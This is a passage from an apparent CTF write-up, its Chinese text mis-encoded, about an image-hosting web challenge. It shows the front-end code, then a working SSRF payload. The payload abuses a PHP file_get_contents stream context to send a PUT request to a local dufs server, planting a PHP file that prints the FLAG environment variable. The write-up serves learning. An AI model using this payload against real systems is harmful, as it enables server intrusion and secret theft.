class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">upload</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">file</span>&quot;&gt;é€‰æ‹©å›¾ç‰‡ï¼š&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">small</span>&gt;æ”¯æŒæ‰€æœ‰ç±»å‹çš„å›¾ç‰‡&lt;/<span class="hljs-title">small</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;ä¸Šä¼ å›¾ç‰‡&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;æœç´¢å›¾ç‰‡&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">search</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">query</span>&quot;&gt;æœç´¢å…³é”®è¯ï¼š&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">required</span> </span><br><span class="hljs-class">                       <span class="hljs-title">pattern</span>=&quot;[<span class="hljs-title">a</span>-<span class="hljs-title">zA</span>-<span class="hljs-title">Z0</span>-9]+&quot; </span><br><span class="hljs-class">                       <span class="hljs-title">title</span>=&quot;åªå…è®¸è¾“å…¥æ•°å­—å’Œå­—æ¯&quot;</span><br><span class="hljs-class">                       <span class="hljs-title">placeholder</span>=&quot;è¾“å…¥å›¾ç‰‡å…³é”®è¯ï¼ˆä»…é™æ•°å­—å’Œå­—æ¯ï¼‰&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;æœç´¢&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;æœç´¢ç»“æœï¼š&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResultContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;æŸ¥çœ‹å›¾ç‰‡&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">view</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">filename</span>&quot;&gt;å›¾ç‰‡è·¯å¾„ï¼š&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">placeholder</span>=&quot;è¾“å…¥å›¾ç‰‡è·¯å¾„&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;æŸ¥çœ‹å›¾ç‰‡&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;å›¾ç‰‡é¢„è§ˆï¼š&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">        <span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">uploadForm</span>&#x27;).<span class="hljs-title">addEventListener</span>(&#x27;<span class="hljs-title">submit</span>&#x27;, <span class="hljs-title">function</span>(<span class="hljs-title">e</span>) </span>&#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = data.message;<br>                resultDiv.style.color = data.success ? <span class="hljs-string">&#x27;green&#x27;</span> : <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = <span class="hljs-string">&#x27;ä¸Šä¼ è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯&#x27;</span>;<br>                resultDiv.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> searchQuery = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;query&#x27;</span>).value;<br>            <br>            <span class="hljs-keyword">var</span> alphanumericRegex = /^[a-zA-Z0-<span class="hljs-number">9</span>]+$/;<br>            <span class="hljs-keyword">if</span> (!alphanumericRegex.<span class="hljs-title function_ invoke__">test</span>(searchQuery)) &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red;&quot;&gt;åªå…è®¸è¾“å…¥æ•°å­—å’Œå­—æ¯&lt;/p&gt;&#x27;</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">var</span> jsonData = JSON.<span class="hljs-title function_ invoke__">parse</span>(data.result);<br>                        <br>                        <span class="hljs-keyword">if</span> (jsonData.paths &amp;&amp; jsonData.paths.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">var</span> resultHtml = <span class="hljs-string">&#x27;&lt;table style=&quot;width:100%; border-collapse: collapse;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr style=&quot;background-color: #f2f2f2;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;åç§°&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;ä¿®æ”¹æ—¶é—´&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;å¤§å°&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;æ“ä½œ&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>                            <br>                            jsonData.paths.<span class="hljs-title function_ invoke__">forEach</span>(function(item) &#123;<br>                                <span class="hljs-keyword">var</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(item.mtime);<br>                                <span class="hljs-keyword">var</span> formattedDate = date.<span class="hljs-title function_ invoke__">toLocaleString</span>();<br>                                <span class="hljs-keyword">var</span> fileSize = <span class="hljs-title function_ invoke__">formatFileSize</span>(item.size);<br>                                <br>                                resultHtml += <span class="hljs-string">&#x27;&lt;tr style=&quot;border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + item.name + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + formattedDate + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + fileSize + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;button onclick=&quot;viewFile(\&#x27;&#x27;</span> + item.name + <span class="hljs-string">&#x27;\&#x27;)&quot; style=&quot;margin-right: 5px;&quot;&gt;æŸ¥çœ‹&lt;/button&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>                            &#125;);<br>                            <br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = resultHtml;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„å›¾ç‰‡&lt;/p&gt;&#x27;</span>;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;è§£æç»“æœæ—¶å‡ºé”™&lt;/p&gt;&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;é”™è¯¯: &#x27;</span> + data.message + <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;æœç´¢è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯&lt;/p&gt;&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">var</span> fileContentDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>);<br>                    fileContentDiv.textContent = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>                    <span class="hljs-keyword">var</span> img = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<br>                    img.src = data.base64_data;<br>                    img.style.maxWidth = <span class="hljs-string">&#x27;100%&#x27;</span>;<br>                    img.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                    img.style.margin = <span class="hljs-string">&#x27;0 auto&#x27;</span>;<br>                    fileContentDiv.<span class="hljs-title function_ invoke__">appendChild</span>(img);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;é”™è¯¯: &#x27;</span> + data.message;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                console.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;é”™è¯¯:&#x27;</span>, error);<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;è·å–å›¾ç‰‡æ—¶å‘ç”Ÿé”™è¯¯&#x27;</span>;<br>            &#125;);<br>        &#125;);<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">formatFileSize</span>(<span class="hljs-params">bytes</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0 B&#x27;</span>;<br>            <br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">k</span> = <span class="hljs-number">1024</span>;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sizes</span> = [<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;KB&#x27;</span>, <span class="hljs-string">&#x27;MB&#x27;</span>, <span class="hljs-string">&#x27;GB&#x27;</span>, <span class="hljs-string">&#x27;TB&#x27;</span>];<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">i</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">log</span>(bytes) / Math.<span class="hljs-title function_ invoke__">log</span>(k));<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">parseFloat</span>((bytes / Math.<span class="hljs-title function_ invoke__">pow</span>(k, i)).<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>)) + <span class="hljs-string">&#x27; &#x27;</span> + sizes[i];<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">viewFile</span>(<span class="hljs-params">filename</span>) </span>&#123;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;filename&#x27;</span>).value = filename;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">&#x27;submit&#x27;</span>));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
<p>å½“æ—¶å¾—åˆ°æºç åä¸ä¼šåšäº†  </p>
<p>èµ›åçœ‹å®˜æ–¹è§£æ³•ï¼š</p>
<p>ssrf</p>
<p>index.phpåœ¨æŸ¥çœ‹å›¾ç‰‡æ—¶ä½¿ç”¨file_get_contentsè·å–ä»»æ„æ–‡ä»¶å¹¶ä¸”ä»¥data:image&#x2F;jpeg;base64çš„å½¢å¼è¿”å›ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å¯ä»¥å°è¯•è¯»æºç  æºç ä¸­é¢„ç•™äº†å¸¦æœ‰dufsçš„å˜é‡åä»¥åŠä¸Šä¼ å’Œæœç´¢çš„æµé‡ç‰¹å¾éƒ½å¯ä»¥ç»™é€‰æ‰‹æ¨æµ‹çš„æœºä¼šï¼Œé€‰æ‰‹å¦‚æœè¿æ°”å¥½éå†åˆ°æ–‡ä»¶ç”šè‡³å¯ä»¥ç›´æ¥ä¸‹è½½åˆ°dufsçš„LinuxäºŒè¿›åˆ¶æ–‡ä»¶è‡ªè¡Œè¿›è¡Œæµ‹è¯• åŒæ—¶ï¼Œæºç çš„file_get_contentsè¿˜é¢„ç•™äº†optionså˜é‡ï¼Œè¿™æ„å‘³ç€å¯ä»¥é€šè¿‡æ­¤å‡½æ•°è¿›è¡ŒPUTè¯·æ±‚ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä»è€Œç»•è¿‡phpè„šæœ¬çš„é™åˆ¶ä¸Šä¼ phpæœ¨é©¬getshellï¼Œä¹‹åä»ç¯å¢ƒå˜é‡è·å–flagå³å¯</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file_content = <span class="hljs-symbol">@file_get_contents</span>($filename, <span class="hljs-literal">false</span>, <span class="hljs-symbol">@stream_context_create</span>($_POST[<span class="hljs-string">&#x27;options&#x27;</span>]))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>æ”»å‡»payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">83</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4103</span>.<span class="hljs-number">116</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">9</span><br><br><span class="hljs-attribute">action</span>=view&amp;filename=http://<span class="hljs-number">127.0.0.1:5000</span>/i.php&amp;options[http][method]=PUT&amp;options[http][content]=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+echo+getenv%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>FLAG%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
<p>ä¼ å…¥éƒ¨åˆ†urlè§£ç å†…å®¹ï¼š<br><?php echo getenv('FLAG');?>   </p>
<p>åŸ http è¯·æ±‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50688<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>245<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEFvaPBTZNbCkhtbn<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">view</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;filename&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">index</span>.php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>

<p>å…³é”®åˆ©ç”¨ä»£ç ï¼š  </p>
